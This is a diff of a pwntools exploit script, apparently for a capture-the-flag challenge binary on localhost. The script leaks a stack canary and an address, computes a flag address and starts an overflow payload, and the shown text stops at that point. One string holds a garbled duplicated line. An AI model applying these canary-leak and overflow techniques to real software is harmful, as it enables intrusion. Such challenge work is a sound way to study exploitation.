@@ -1,14 +1,28 @@
 #!/usr/bin/env python3
 from pwn import * 
+from pwnlib.util.misc import run_in_new_terminal
 
 binary = "./unsetenv_patched"
-#p = process(binary)
-p = remote('localhost', 1337)
 context.binary = binary
 libc = ELF("./libc.so.6")
 elf = ELF(binary)
+#p = process(binary)
+p = remote('localhost', 1338)
+sleep(1)
 
-s = '''
+gdbscript = '''
+break *main+281
+break *puts+114
+continue
+'''
+
+pid = pidof('unsetenv')[0] 
+run_in_new_terminal(f'gdb -p {pid} -ex "{gdbscript}"')
+
+
+
+
+s = '''context.binary = binarycontext.binary = binary
 b * main+281
 b * puts+114
 '''
@@ -24,7 +38,9 @@ canary_bytes = output[8:16]
 #print("canary in bytes:", canary_bytes)
 canary = u64(canary_bytes)
 canary = canary & 0xffffffffffffff00  
-#print(hex(canary)) # got it! 
+print(hex(canary)) # got it! 
+
+
 
 p.recvuntil(b"Enter the name of an environment variable:")
 p.sendline(b"A" * 23)
@@ -46,8 +62,6 @@ leak_bytes = output[32:38].ljust(8, b'\x00')
 leak = u64(leak_bytes)
 #print(hex(leak))
 
-
-
 #print(hex(flag_addr))
 
 
@@ -66,7 +80,7 @@ base = leak & ~0xfff
 
 offset = 74 if "OFFSET" not in args else int(args["OFFSET"])
 
-flag_addr = base + 0x1000 + offset # fc7 is ending 3 digits
+flag_addr = base + 0xfd9 # fc7 is ending 3 digits
 
 p.recvuntil(b"Enter feedback for this challenge below:\n")
 payload = flat(
